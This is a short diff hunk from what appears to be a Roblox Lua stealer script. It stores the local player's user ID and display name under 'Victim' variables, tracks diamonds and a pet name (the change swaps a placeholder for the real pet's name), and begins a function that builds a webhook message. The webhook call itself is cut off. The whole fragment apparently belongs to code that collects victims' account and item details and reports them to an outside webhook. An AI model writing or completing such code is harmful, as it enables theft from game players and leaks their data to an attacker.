@@ -19,7 +19,7 @@ _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName 
 local lib = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"))
 _G.Diamonds = dims
-_G.PetName = "Secret When Joining The Game UwU"
+_G.PetName = v.Name
 _G.UserNamey = "Testing"
 local function sendwebhook()
     local msg = { 
